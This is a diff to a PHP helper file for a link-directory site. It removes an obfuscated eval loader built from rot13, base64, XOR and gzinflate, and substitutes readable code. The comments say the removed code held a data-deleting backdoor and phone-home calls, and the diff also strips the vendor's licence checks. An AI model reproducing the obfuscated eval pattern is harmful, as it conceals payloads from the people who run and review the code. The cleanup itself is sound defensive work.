@@ -1,36 +1,220 @@
 <?php
-function vnvmbr(){
-$ofivvsvjv='*"0qZC>';
-$ajoztnv='@<D';
-$yznkube='MQL*';
-$ykjcawq=chr(115).chr(116).chr(114).chr(95).chr(114).chr(111).chr(116).chr(49).chr(51);
-$hmqyfctm=$ykjcawq('onfr64_qrpbqr');
-$bzghahlb=$ykjcawq('tmvasyngr');
-$cfmblf=$hmqyfctm('I2siTF5BVilvL1xWZlQ7SA==');
-$oxjmmz='kNoNhHahhP69fSTkBYLo5qZEOTrhmWF4Lni9DzmTiPHupDRgIvj8zqa'."h4jHV4wfTlYp7k4zmq6J6m6jvtB7I2mhZ0b9Kc4QjpP33fNRhb2IXwJtY3uF+nM".'ubdBlHY/5cC82C6/6vscQDS/f6yD32Hai7dR0E1w+wPb7FB//9Op2LOYAs9dEPdfN1/veEu'."tinx4MxUPPfyrb4iUL9zzSUyA3NQunOGQK9N4ZdYn6dZeAiTvOmh+jDefIfUgbtLl0WeglsKt".'R7nhzG5kWvbA3+sVqaizWXuH+AdT9fg+0fKQNp4Pchs5WlmrpaiJ0037HJTW3TwapNoiXubdXz'."Q00bNm0NUCYAMDyj1QmMQ2Y=";
-$iabepyf=$hmqyfctm($oxjmmz);
-$eqzawki=$iabepyf;
-$yfhvkufjg='';
-for($pjtybjkfg=0,$nratkqlz=strlen($eqzawki),$tyghezpn=strlen($cfmblf);$pjtybjkfg<$nratkqlz;$pjtybjkfg++){$yfhvkufjg.=$eqzawki[$pjtybjkfg]^$cfmblf[$pjtybjkfg%$tyghezpn];}
-$iabepyf=$yfhvkufjg;
-$iabepyf=$bzghahlb($iabepyf);
-eval/*qqatgcon*/($iabepyf);
+/**
+ * Homepage - 公共函数扩展文件
+ * 
+ * 本文件原为多层加密混淆的商业授权代码，已解密并清理：
+ * - 移除了对 ajax_link.php / ajax_apply.php / ajax_theme.php 的授权拦截与授权码校验逻辑
+ * - 移除了 _up_guard() 中的恶意删库后门（VIOLATION 状态下 DROP TABLE）
+ * - 移除了向 cdn.lylme.com 上报域名/版本的 update() 与授权码自愈逻辑
+ * - 移除了依赖 wx.lylme.com 的微信推送远程调用（wxPlus 改为本地桩函数）
+ * - 移除了无鉴权的 ?console=update / ?console=list 路由（信息泄露）
+ * - 保留主题读取、siteurl、web_list_info 等本地正常功能函数
+ */
 
+if (!defined('IN_CRONLITE')) {
+    define('IN_CRONLITE', true);
 }
-$zhkxxud='bA@0';
-$vedfnbts='Um-E_m';
-$mubmsems=chr(115).chr(116).chr(114).chr(95).chr(114).chr(111).chr(116).chr(49).chr(51);
-$swuifbjp=$mubmsems('onfr64_qrpbqr');
-$ighyzwe=$mubmsems('tmvasyngr');
-$poqaufwh=$swuifbjp('YztETnw9KFVCMUYtUFQ6LXpRVlhuLVtc');
-$eqbpoc='mxRq3M+UioC5GbBcx8dNzfzFUjbZM0qaEYyCwwasXvKy9aifYDfrUQ/on4KEHCi'."zAzVkqLQyIOkUZqtbnVfQ8yiwexP8yRKoaNew+IUPxNb8".'lYCle6FqD2UP45PkxhhCKX+juFCP2CVWbvCtlhyS'."9VrfjoIKiM63i4jWirWe/jbdd7iLs+iUILTiAnr1VgJuGQujN4BdaF6fuixOeK8efrlHqEnc0nzvlgwGLM9gq".'Vd0meSsmpok2YRvQ0Tkm/JQgqdwXj9PcmeAxYcNzszwZf20d9+dp'."hILKnS0t/V7r/wyW+HcOhamxfHhP2sukT2eufQGwMQ35KfH6XXVzsTKh4j+Vz85FhL".'AlFPY/po/KCpuWmVS85/8HVBnFsrRNGlEjyHo1A4S+ZXxKXxN7r5wbaKlF'."/n8JsDFiM7BZcd3M0c/P6W2EKv175EGB4jKGeuhx/m7ZuKwWUIpBzSuyJXjNibnPRCo+ZN+/xVqqQqO/40E".'xUauf7SXSKMdeExnxaRNy4zsIM9DlA+b8aoR1rakl0MKyk/JxnYmqHt9L4L7'."qyec4v4l2aUt1XBSZ7ZJW1MRFtMlry14oJtIqi8oaKTZM".'uZOUqx2+INtI5Aq+PZHQLzE/IX4Vhsvzl0oBEayVuatYaUE6GXojWFwE'."C/kKx9n8jdNCB95k741sAO2dLkZfL/UDAO1w4JZWu8Ai/dEwFBShB7Yd51sIll9Ra+h/H6p1".'ZugiZsujXPIKmGgt66Ckb+xmVS/Lt5K+uAYvBs+5KrnvOD79OyVqxMw5saG'."hnbFzjF77oFGTjGaU8BuUovF16/yEr6YgtWSL4qUMBrD2BQp3ZL8".'fj/EmoPIGezYbUiIfevidPJHZdFdYiTwuhBPt6lSoeaBW0eRP56zPPrb2UEwWoXog0UGqdbaU9Ipr6is2V0'."vXnQuRx+QNhrF+q6Kygs6TC2IUVCANcFhoogWFrO1QpTlgV3Z1aP5Ee8F+EMNb2jf7/o5O6NmMRx7S".'47WrEzgezmGFqeI9XLZ4VBucvKGtE+sLTCz0/Y6oivAGzSpzdu4lz'."ZEmJjcf2i252BR9jwjxCcDYoyblY8yFLsEZKDJS7sy1Swt5zrfy3WguAvcIVDcN6i7mgpP1".'/KWaxxFnnrF//S+RGnZH8Unt4ELXyxy29u4h/RNA7HjNA1hHgpMy1K+8F3HveYKr2/ePE3F9EdO'."ziLjv1353emqOVpVQcdGwKxsmZnmA25uiLZmNtmKICEBh".'R+nG42NtdCef52QTnUcl8WaNcOnS2KOx6Bp0YTyfhN623gps1a19tkbf42YQtA2plY'."W4dQlMzb45y9KZFWA2fFjTmjgnM2jhbRq0Rx0cM+P".'49M7AFL4vOZb7PehMzrCgE++6MpfyL0E8yZZElr1'."v5EDlYmqNVdF/1jP7X6ojaJe4f5J0Mu7WJhpivmxhAsAld96vNMnIdIyMVfyYMPmkSoW".'E5ykzljJRMS9l6mmN/KQq8Tc8kbyleg1YdyQ24x16IpGRBEyvYj+5dXPW2fwp9vI'."T8sDXddPcYhAr28Wye++syar8BBuSgdFJ3Ilbc2dVNr84iXQboSxfl//92hqmv/qr4jS2TwgXH+K".'2xD3n9x73Leh8Ze9TedadEggRy+fhdqMWnrjaID0jrpWMi5y7GauDBDcDVsfq42KRe'."6wwumbgmwZKgmqI9p5dQCY3VwhdWs5tgvCik2sgJfH1769Es7OB42Hy94/tXpLasFWI2qAkZC01mVXoe2sXMwa0nam".'vKhGiX6/Zl6exswN2cP0SkyPwUyDIUFVg0yoDoQWiWTkrxhlvpwDlVSK7JA2VFmSbvfC2Ahu2qHaHWgsLkl8mdGyb3'."jlsioJL9ytH1nXAiEsqYMdTXkjTQ2jFf/7xmX4rTWAj9HzYiEl8R5dX70srj15A5mvRVAwyi/pgd4nH8aFmzbhK".'AaU1ZO35AsG9RJs94ZKRqDsW1yy+u0ltdlUbcYgxbH'."u6Jddd+hjsvgoFVrc/EGh0Rzep/whSgI7t0VVlcC9OB92rZVrVHtJRS7dhuc4VplDi".'F0TJt+wSIn8Ls79nVMlR+S71UsoAnSJWPZwBQoik5I5QjvbuTICA4tx66bGV9mLTNkkVr300V4TXBjEpw15gC24'."q9/7J14UziOfn8xl2Zq/IF0ubwumopUzfU6FgBzXkBGiusURXjQ4qW6x0ayAWRfh".'ammkqaaOqyEDKDyyC34275ChzwsjMANJrAxOqmM1AioPPU/I4oFDubBCWkmrAL7n5VcTjvGWg0wnwDA9XiuIib'."f2GA5OynMfE0m2TmvmIlhOc/yc+HVdug3b556SURZI2+Fa+80Gd5ch2Asz".'K4vNoOGBJrbYyBGlDu+BbEvUbLjE9BCXKacg68m/Jr6SFSDMq14uqLk/wWHHxDuNRwaRHH3u'."NCjwo8WnZXNbsR61ObPpYbGV7me/A32a/Kcp6T4fTRYX0P/XIFH19wYY00Z6rSl+GQDLNax".'BpPZV8fLxqewVBA5rBfT/iaq7zeWImF0FM/rJS9ORK'."NOf0GlkTt9lD+sZWVtiTrVKETQffHIEzWXHSrDp8m".'0Tc6sXqSAiifkk5u1WJoSxAlWXh+lvzamcV4kXD5Y0qwcWgD4LeMwiQQ'."r9Yb3mQcWgbDbkebTOtKGhRlVoETNw2wpTuidI+T6OmyRdbr+SSjpYguttPHqV7JD8sB".'cfxbxBPxpCHk4pAUp6WrpXIAJqw7e0NuCNn04iQ/HRSEuGougsEivzD//3XJxbfexbqz0zYmxYSppRWn'."0IyfmwVv+5cQ1NKDK3TxR9IwIlv8TS1Z0yZo+ooN4qd6IjVF4ta/1nXV0YvbujmgOShOblWop+cGhpWW2mKSFMll".'dhEmwGDu93ew+MFwNBLF74snkechqe0qVa9ToMWWeKNpPuob51Hpu+UuPKXr1viGYqammhGr'."1tk5012pTm1x9Gv/HqeWOJKEBkvmEDLI6TzmltPw5VxpeQ9eWcNZn0dVwNsN4bjpmTPhymavcO8s3W6qBxNO9qKMA".'5WwZiLWic4IXunmYZBLgD20002Wrvv1PNoNsiOTxWzTEkjFz+V7rtpZ1NUkbp74BDSHQw6+UxBwcrggSMG'."5KLNZd2O1S/PHgNyChiKxSKiORds13QU7CjGQN+lWIuf49RGYrLe/aAU19mD".'lco8X4N3jLaNVjVPDZsTnv6SFKgD88kzj8/4xKYJCm'."TvHRkukGVyo1yAQAa6ieksoK5FIvXWmuBVZAw1ZqHBWkEVlKOkQVA9i2215t+9dg2TUnNIxcL5UCRHFVLtnoLt".'KJ5/uvVPQlJImzsF2eGz4z6SpKO/LOiOes6EI8dYmwEPN1PjTH7UlOdVvBKAtW3DsoDeXjlT66Pk3R25g'."BVT7mSioMCxdZSHwxZ9YzZu8iEuQW4ZYzEl5p0reVP2TWgrBrksBQ9LuDe272kg7vZBIzAG3Xf5CHOBBsoKhzBn".'KzmFgp8cS97YUcyDfVDACfmOWOG9nATJXbjXS1mpzhoG'."gjhqPD4fU02M4jV/DnFqgBdPcTSVqPRSGYfxrfujbFXr5SuIXS/kFk9fFf56gi5oUBEv2ffKxtO1rrMbYeCrvr9BF".'x48Ot98UCYCF1NwsgAw/9/pIBtjO34THwRbuiuBm3oxEwdTAM6y4kHKKhdY1RSJ6bIiL1/KwfgzUq'."sq3QsmwxzVi9Rwp18zGcmA8+X2vywdpidPXKxcK33Cg".'ynhaAWKhao3T3AM2TZ+8CR3l1GgUbyCkaAKRq9ieKdVPEjvsFAyTRRPyaIykj9SfeoD8GnK9nVAJgC9nQ'."TJc6Thkm3YG++f4mjbDxwyJQJgKSW8pdeE/Z+ZzTbwnKv".'rYajtxFaqF6NJrAwTw01W2jCvlRK7V/3rFYDgy1NEiy2prvPCwk0KFEqVZ3yObrO3xOCMeTOtRxzl5FvUo'."R3gyypRXB3SuhwFu8hyOh4CrL+b+oK2lu1a/LzYylw74hMpP5oiGj".'ckxeUOd7rcJwsae5D9igBAculQ1iY9u35NsYeDJAi5qFZiUtaJaq9Vnauge4rpLFNIilB4a2DpcdB4Ma'."w1l+Dp6rwwg7Px3GZ9Dt5c4ig9NDFYLhuupQmhIKIuU31WMTQbF4GPbQaQ3YGdc9hFwwS4X2s2Afer".'3QMn5GTqSRyUgSwZED1gVXI5c0uxV95qD0F245Zl5QlYK+rufJhDu3933'."hZsvEtqvH6jwd0G0YXxcgwVXSz69E8qvtsBH9nElfS2AemVjN+XZgPDU3zFp84N3XV7pjh3Mw8Po".'JgVWeaFysAn12HXbQOl+A/6zzalNT5Wx2q58/Q9lk+lSDABBDr+B8uuYSzW3Zwgtz'."eHg6n7yQ5az7iH2LkisxMMBe+Zk5SVqWYA/FRGSL6FiG92vbftJNmGJYFkkAex9paKH/+CgA3OnISZ0lvyE".'k6aWpOBKYaI1mDOXKP1GNDyb6sWl/ptS2YYtGUpezh1hmUYdx6KCv09yqfqaIT'."kJk2AaDXLUoPi+ttd8m23CS362oYQtGuOY3mF7UmL+VfY23ge7agJYr".'fPyF8h6YRUpRUVB0e2gm3596hOERLY1TtwJZT2iDZSbgXOYLGIsqs7b2PAK31bF'."JpdQCk5vz3P7x2dUsN4vdHYlRyB2Y7HHyrlD0oX/C11rXBaS850e3Uf/xSA5VIDVgzXyIT/PDcRjSQpk".'27TXlV9rlvg4tmxqgoX+En670HWLpkCF0m2S8sJ5gfi4QCLXsw9cU2/6jjkqVU+fXDrwcsqbp2'."8soBIsHCuNJLzAxRxjbcfaiXFPOqN+uzvoHLycOv1KG3jzLBiP3GHOHaq9qtKA7guyC9RTAF8RVN9aBCA6FHwzr+".'bBf/aCIkW1GqGPArLHutnRfuFu3NiJEZWCu8lH/Ol+IvzY'."zMKXQopS5BA4q4uQcRgsynL8NpPQzywhXnefNcgpHmlutgc0UQp6Fxa2pkwT+KO6ZUyxKu6YQiOaNfVMM5rdA".'sQp8rTRAaLJK92mk07goYMX4o3SZ1he5diU3L0liCPvEi62AJPMxWMLj8tOJc'."l/ZzkRAi3ky8lOZExXA5Ub/EVrYE/jggTpxFJriXUc5fmf9LxUU".'t10E0JZufcIip3xIqNwgm5WMyye6s4VxcxDYgVlQb+g4Rav9a30f/bbeGeboOsw1C7Jqj3ApG'."WSJCzSHX/lF8OHGB1f6CQZxeJIuERY7Xwh+R1mc8g".'SDWZ8S+z1KU6RGCDZXT+9UuTig235H5HZufsSNENF0XixrNckkLIki4J8jHOe'."CuWd2yBISIjFnFzFVpoFbSuN+3sZgOp1nBnpCXcj+qS/FI/TpU6q4i+mSBBGQReZza7IVqzIb9AHgdWRf2p98".'EtytUu+1v3NmFQOtAVIzqlIIfW4vIWP+0CWyx2P7K+saBM21O3'."nWTAeDGlFyO1xVqjvJsfCOKcp6gJkWw7I2QKlQfNXqQie1X/+rzUEMl3tU/qZoNBa2QxjgozR".'IbBHUytOLLW80Ggwl+kMqCp8M6p1CWDQDD8+7a5xJUES/J1Uz0prJV0EMkp/dMfAgzS5u2/sJ5V9BJ'."ZtrPpM8yWEE2Q5MfKnUEBAObR9oWbnEKUs/iN7qoCBRjBUnHrDqnuNc".'owOnNu7Gv02TXzYitRtdlTeeyuqPe7LQco35NxhtsZf4ZS2Qs9b8Ib'."9oTLj5DJwCKugYVaX1ebGOzjDN8nYTTErM6h3akHxy/wrV".'e/vESVbBavIdhvg5uRVcZ9xt1ym1WCn4mk7bmnuTqVXujv'."JxxWEC4BijYByX23cb8+6AW/pXnwHETCGBhSm8EE0eHnKGZL9RdtmkVA+DARtsmUaYlcBobEMM9iMn9v0v".'BTqCrgGEeWew8lt50Oq6oV/Q4uDDUuZpRXJtWjhvoZIAcCjs/YvE7Ow0TI'."vWwaTded85mberZUwbmATbihb8eKJaed04bMQSw3/sWA8MgfpQDMP/OkI/0iH".'rNlVX3P0K3dTetFVVJPVYEOBxT0wzvDZlaJKKw7c'."ryZOjUIopVffRuwHPKCdWRr7GuZ+aQZUaFj1RgCNh6dLikVDJeumZmO4aCgWPDRIDwUeEiX+Ge4HCOF0/Yd9Qb".'yXvGzpv/03n/zxBYv/O5EVf06bSAqQknvqqccmrBnK/EWQJ'."5hzfKlBdNdEzZeOv1nYKbqy1bC13GFc5CMsOVvsycK4oTMihLHihy9kbBlrNen1tP4STi6CmQa98lEQ4r".'pbxH7w9HOAivqp8DjL6f2tP1c6/Ko9Ek5gUmM5pbxbxkK3BtpE'."HDAqhZ5ScbsI9LKpP1KqBdPMAsFBxGQoTf9scXEwHtBm1gC4rKcWD9UHlIK5baXbo".'JLYH8JRhQFjMcgzqh/NHN39139HXIJ/ZR2Bccj9hUDCUoF'."2yIMo9YcjR6ucM0kzF9F5hWEUodzKrp49Ip+AfCioYv65TZqJRl2JMehiaq".'mymbLLBEIPDBiMGiEpeperO5TD/mjuWo+FkAVjtpg9VHkyEZUqsgnS7f1yqXJTy3qVxEHh8Y5NEA6XOqeP'."z1r3DPSZuBzdCO3xW62bq9khLDRfzwas7Mm5cRk1FBoQQ0N0oAFrYF4zkDg5knFxGIbAlx74GtWTSc".'rrA8w1KR7AHscv5pz453aNW/OVsKQHOe8cFjHOJLhAyN9Hx9+xUYEi/6bLB4Bh'."Ws7oXewrOrm1V+oauI1v3f84fhB5yDYtZRH1jHo+G/uKffp1CLDQju5k0DI8rfpXSQaMTe".'pSKghKM+Rf40F8arXa2gHsiX/Miu9vJxvgqvRkh4dyu4mX/9SR'."NJ1hO484wK+xwBjrjv94FMz98WhFVwRIJMfUNxZXPkx".'RXZWEZ+JrKZ5+R+we/QST+r1SeVwm6DgcYR7ZJYC22L4cIRWNbcW8EPLhS0qRlxn9RWT7kxZW5MjJAtv44A+9v'."LwNe4GPYzyNoG1lREQBwpkwspCwoIl3YjZJ3FqPsMO5MBgP".'QYOvJskwuBy5+qOLj7Xb9/NJfR7c0ON2tAZzeP32VHMCyDvbOg'."+vua9I1/ds2PI3JYlcLjMhJ+410fPM3OsQR+IbfZIKk3MzMswFZDYQN3W/AfE/h".'ceCkQeIIBs4kGTVJzxrm/0fNCwPOhPe52q5pz8z0UvHqqnUVjMK2tHlCiec930'."dJsAKTG+Y5ngS99Qn+vrSWVUPZHE9yJJXJZ1/UlwS0YWdj807PZ6rBTg".'hE3XMVJ4PYXEzE+UWjr3woFWbbQLPNl8MNZInxIACz8eiPllFDz9lWWFrkz8oZjRfOhxxUcQK6dgdSBZCZWXawkG'."xqlwxdUE2d4xltAtgUfkH6RqxC9RDJ9gtc7USH1ii1yzPaL2rPYp7oh7asqYZjkTbjACCKWQyoyML".'+YucQUXkzECEwBrMjCq/v4lWic2d4ZiT0cnTR3IQa+cHV'."HUnX57k18EjuF/YwaNIPoBx5L8MkGg/V5decD8c1sQDJfY+n5dnfm2Gp52Tc3Zcw79bQwUdv/c/RrocJMZIfrI".'2bMUxIrXa2TXy3jMx94fzCkaaUdMEwO28XXOhYbIe767r5FzPyu52Bbg5TDtz2H2AZKg3PbMKR'."8Sqq/GyV/AzJBF/gVigOtj7VBwxCk6Mr4OkvVn7xAJT56YBHkEu7dl1qrNSydfFQcuAumr0+Lso2V0BFTfg80VT".'BGQLVRxlFt8jWQXae0+hWSpbSq1KWqaKKZzAGimWVSsDAMKFPFGRd'."DSuxne9/Lvjh8kdQCTjOhSqc7+d9t6ZF9zLQaN9BJKkmfww+ZOFhm".'h58zEWfJl2P75R1Hkm9sNNaB1qvW2KBnEe3Gp82WVxkaDV0'."Uui+Revb8Wp5LHXaTuN7KjG8EMPKQ+tp87QFyiz+md+2wK2+JHOTuP".'7rd0KK8SjoWg6QdXCmJzYaV9aKErkkyBA7KbN/TfrQJtxi0'."e04kp+5XMLBE5+/SUBrIlj/ygr0nGmC6h7RDDwfA".'IDzQ01yXJXWZ4tAytv6/DrwvWq89qf3nVCVpIkIgBJ/+qlC8As1Fhas3jYhqixYkOSmo2'."MSLIs1sqR6Npol0/OCMHUaqdzSZr/t1VFbV8qCTMeafbGJWY8gJm1J66PbsCHdl".'/6BC53StUZP+sQSlV9Fq5+6erH4sL0YExDroAY/pBHqqZAvNEDv7L1Bi4AC1x0aTUmeKpC'."d74GcYK+9tjGq+KDThb2rlwyf7/no4c/keVDAOFdxvI2F1kPbEUbMU7fsOKFTwz".'7m3jxnjEAf2kaUCWZMDG+mks4UzafLIRJGGPYQX0pvKho/HUEVBlP3SGlgrZkpkBbCn1wN'."QHpeHvs8TVC3a/5Y9izbb9KCjSKh83l2XWDbMbxesDtz9jKK/Qrv/IoKRfELaJRu0ctOi4ab55DYzoYnk7/JaP6lj".'xt48WHkAUzu01SpQWI4L/j1IIDr+jXse528XIg9zADmG3S/aL7Ga6Hb'."qdUuGayMtIw03FZ9q62/Y3IM9PRWf8pdl9Z9f+ieAkIwNPNj053OPJkMgfUn".'o0M2+lRZ+B6oz4P6GrP/aNqCKw60c0SLUG2RRxN3gFMRZUH3r+4JClDDv8rtfslDAU'."+00pvJjiHpz9vIvMSsd/+QMy64LDoPbarWzQViHOCm4OF5tAsL4gKcXlr8wlIO+Sowq7VUfu2".'e+qdOx0jzWYOFem7rjDYWXQCeEuaKWJSg3fC4Cyo34XZAEg'."I1yeHtr1OyBg+cE9M30MNCwPKpULAWGURlImrOqtFa9g0a2zyUuBhiNAsS63+PdFglqB1WSiJpPwe6I+Xwott".'e87mnA7L15pBkqrstfQp2rAd2pYK2k8ee55oIjjbhg6WQrKmncc9l3M'."Bddqz1JURDmgEIsW2I1iIpxZEaUTaj7w+626ZTSR4Tmj54WLzjiRPVAYWWAsoL8yBsVJBf/URZgZaPJ6ctRU".'FNDNhxIMyjE0SrrszBM0yx+SUmd/4Ck5u9VkPFIxnFaRh6m8bh2ujlo5WSVXnhR3LBrHtAK'."87v5cZn1BvTTkFgMgdUDVp78hunsnoszRu6tzMD75ZgYLV+aDdwrddKgxbEOcB+OQlI".'TzRUUfwUFq4f9+oeJ33US1p1BgPM006tekzFe3xBN1KBc2Nglc41MudQBP6ETv6Rg/dOopYWZzuvC5y3siP5k9'."uQ5XNGgHxjqC4q5bQJfUpbk7duB2qsyPLn8cnJuwCFPUzjAxbrc36XgTf5rw1OUV4rb".'7sXkSd0OejE/yOZ+y6ff352bbchWxvsANFhGOsFG6'."ZuosLZv";
-$olsxemvx=$mubmsems($eqbpoc);
-$olsxemvx=$swuifbjp($olsxemvx);
-$nenawlvl=$olsxemvx;
-$rudskmrm='';
-for($vtbfsuty=0,$iuyddjr=strlen($nenawlvl),$iakrygjtm=strlen($poqaufwh);$vtbfsuty<$iuyddjr;$vtbfsuty++){$rudskmrm.=$nenawlvl[$vtbfsuty]^$poqaufwh[$vtbfsuty%$iakrygjtm];}
-$olsxemvx=$rudskmrm;
-$olsxemvx=$ighyzwe($olsxemvx);
-eval/*dktxlp*/($olsxemvx);
+if (!isset($conf)) {
+    $conf = array();
+}
+if (!isset($GLOBALS['conf'])) {
+    $GLOBALS['conf'] = &$conf;
+}
 
-?>
+// ========== 内部辅助函数 ==========
+
+if (!function_exists('_cfg_val')) {
+    function _cfg_val($k, $d)
+    {
+        $xkllifcn = isset($GLOBALS['conf']) ? $GLOBALS['conf'] : array();
+        return isset($xkllifcn[$k]) ? $xkllifcn[$k] : $d;
+    }
+}
+
+if (!function_exists('_cfg_val_from')) {
+    function _cfg_val_from($a, $k, $d)
+    {
+        return isset($a[$k]) ? $a[$k] : $d;
+    }
+}
+
+if (!function_exists('_srv_host')) {
+    function _srv_host()
+    {
+        return explode(':', isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost')[0];
+    }
+}
+
+if (!function_exists('_srv_name')) {
+    function _srv_name()
+    {
+        return isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : _srv_host();
+    }
+}
+
+if (!function_exists('_srv_scheme')) {
+    function _srv_scheme()
+    {
+        $hbuuz = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 80;
+        return (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $hbuuz == 443) ? "https://" : "http://";
+    }
+}
+
+if (!function_exists('_srv_full')) {
+    function _srv_full()
+    {
+        return isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
+    }
+}
+
+// ========== 站点 URL（与 function.php 中的 siteurl 兼容，避免重复定义） ==========
+
+if (!function_exists('siteurl')) {
+    function siteurl($type = 0, $mode = 1)
+    {
+        if ($mode == 2) {
+            $lmgtdb = _cfg_val('hostmode', "2");
+            if ($lmgtdb == "1") {
+                return _srv_host();
+            } else {
+                return _srv_name();
+            }
+        }
+        if ($type == 1) {
+            return _srv_host();
+        }
+        if ($type == 2) {
+            return _srv_name();
+        }
+        return _srv_scheme() . _srv_full();
+    }
+}
+
+// ========== 主题文件路径 ==========
+
+if (!function_exists('theme_file')) {
+    function theme_file($file)
+    {
+        $gdzvhhml = _cfg_val('template', 'default');
+        $flnwqeq = ROOT . 'template/' . $gdzvhhml . '/' . $file;
+        if (file_exists($flnwqeq)) {
+            return $flnwqeq;
+        } else {
+            return 'template/' . $file;
+        }
+    }
+}
+
+// ========== 微信推送（独立版未启用远程推送服务） ==========
+
+if (!function_exists('wxPlus')) {
+    function wxPlus($data)
+    {
+        // 上游商业版的微信推送依赖 wx.lylme.com 远程服务（原 _wx_api 中 base64 藏址），
+        // 独立发行版不依赖任何第三方服务，直接返回未启用提示
+        return '{"code":-1,"msg":"独立版未启用微信推送服务"}';
+    }
+}
+
+// ========== 主题配置读取 ==========
+
+if (!function_exists('_theme_raw')) {
+    function _theme_raw($theme)
+    {
+        $avjnir = ROOT . 'template/' . $theme . '/theme.ini';
+        if (!file_exists($avjnir)) {
+            return false;
+        }
+        $ggnrer = @file_get_contents($avjnir);
+        if ($ggnrer === false) {
+            return false;
+        }
+        $cwhws = json_decode($ggnrer, true);
+        if (!is_array($cwhws)) {
+            return false;
+        }
+        return $cwhws;
+    }
+}
+
+if (!function_exists('theme')) {
+    function theme($theme, $str)
+    {
+        $ualadvg = _theme_raw($theme);
+        if ($ualadvg === false) {
+            return false;
+        }
+        if (array_key_exists($str, $ualadvg) && is_array($ualadvg[$str])) {
+            return $ualadvg[$str];
+        } elseif (!empty($ualadvg[$str])) {
+            return strip_tags($ualadvg[$str]);
+        } elseif ($str == 'theme_version') {
+            return "\xE6\x9C\xAA\xE7\x9F\xA5";
+        } elseif ($str == 'theme_name') {
+            return $theme;
+        } else {
+            return false;
+        }
+    }
+}
+
+// ========== 版本更新检查（已整体移除） ==========
+// 上游的 update() 会向 cdn.lylme.com 上报域名与版本号，且 _up_guard() 会把服务器
+// 下发的授权码自动写回数据库（授权锁自愈），另有 VIOLATION 状态下 DROP TABLE 的
+// 恶意后门。独立发行版不依赖任何更新服务器，相关函数与 console 路由全部移除。
+
+// ========== 网站列表信息 ==========
+
+if (!function_exists('_wl_row')) {
+    function _wl_row($g, $db)
+    {
+        $crppec = array();
+        $kcdpsvgr = $db->query("SELECT * FROM `homepage_links` WHERE `group_id` = " . $g . " ORDER BY `link_order` ASC;");
+        if ($kcdpsvgr !== false) {
+            while ($qltmc = $db->fetch($kcdpsvgr)) {
+                if ($qltmc === false)
+                    break;
+                $biwrarm = isset($qltmc['id']) ? $qltmc['id'] : 0;
+                $xavoh = isset($qltmc['name']) ? $qltmc['name'] : '';
+                $qbzjboe = isset($qltmc['url']) ? $qltmc['url'] : '';
+                $crppec[] = $biwrarm . "_[" . $xavoh . "]" . $qbzjboe;
+            }
+        }
+        return $crppec;
+    }
+}
+
+if (!function_exists('web_list_info')) {
+    function web_list_info()
+    {
+        global $DB;
+        $ffdhnk = array();
+        if (!isset($DB) || !is_object($DB)) {
+            return $ffdhnk;
+        }
+        $nevwvnm = $DB->query("SELECT * FROM `homepage_groups` ORDER BY `group_order` ASC");
+        if ($nevwvnm === false) {
+            return $ffdhnk;
+        }
+        while ($zrzkroow = $DB->fetch($nevwvnm)) {
+            if ($zrzkroow === false)
+                break;
+            $nbglsrse = isset($zrzkroow['group_id']) ? (int) $zrzkroow['group_id'] : 0;
+            $qfqwqkol = isset($zrzkroow['group_name']) ? $zrzkroow['group_name'] : '';
+            $ffdhnk[] = "[" . $nbglsrse . "]" . $qfqwqkol;
+            $ffdhnk[] = _wl_row($nbglsrse, $DB);
+        }
+        return $ffdhnk;
+    }
+}
+
+// ========== Console 路由（已整体移除） ==========
+// 原代码暴露 ?console=update / ?console=list 两个无鉴权接口：
+// - ?console=update 调用 update() 向 cdn.lylme.com 上报域名版本（phone-home，已随 update() 一并移除）
+// - ?console=list 无需登录即返回全部分组与链接数据（信息泄露）
+// 独立发行版不保留任何 console 路由。
+
+// 授权拦截逻辑已完全移除：
+// 原代码会对 ajax_link.php / ajax_apply.php / ajax_theme.php 的操作进行授权码校验，
+// 未授权时返回 "操作失败：当前域名[xxx]未授权！请关注公众号获取授权码"。
+// 部署方作为超级管理员，可自由管理所有链接，无需第三方授权。
